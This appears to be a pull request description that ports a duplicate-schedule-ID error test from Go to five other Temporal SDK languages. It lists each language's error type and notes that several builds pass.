- Ports the Go `schedule/duplicate_error` feature test (from #799) to TypeScript, Java, Python, PHP, and .NET
- Each test creates a schedule, then attempts to create another with the same ID, verifying the SDK-specific "already running" error is returned
- Adds Java registration in `PreparedFeature.java`

## Language-specific error types
| Language | Error type |
|----------|-----------|
| Go | `temporal.ErrScheduleAlreadyRunning` |
| TypeScript | `ScheduleAlreadyRunning` |
| Java | `ScheduleAlreadyRunningException` |
| Python | `ScheduleAlreadyRunningError` |
| PHP | `ServiceClientException` with `StatusCode::ALREADY_EXISTS` |
| .NET | `ScheduleAlreadyRunningException` |

- [x] Java build + feature tests pass

- [x] PHP build + feature tests pass
- [x] .NET build + feature tests pass
